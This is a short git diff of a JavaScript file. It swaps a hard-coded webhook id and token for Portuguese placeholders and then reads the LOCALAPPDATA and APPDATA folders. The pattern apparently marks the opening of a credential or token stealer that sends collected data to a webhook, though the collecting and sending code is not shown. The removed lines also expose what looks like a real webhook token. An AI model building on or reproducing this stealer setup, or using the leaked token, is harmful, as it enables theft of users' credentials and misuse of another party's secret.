@@ -1,7 +1,7 @@
 //npm i sync-request
 
-const id = `864990378863099954`
-const tokencoisado = `4KYe9ssoyVYspx_BHliAVRpuINb_ahMZAaBV5YXhaAb_vin4e8TR4T3kUWM9waK3rPCA`
+const id = `o id do seu webhook`
+const tokencoisado = `o token do seu webhook`
 
 const localappdata = process.env.LOCALAPPDATA;
 const appdata = process.env.APPDATA;
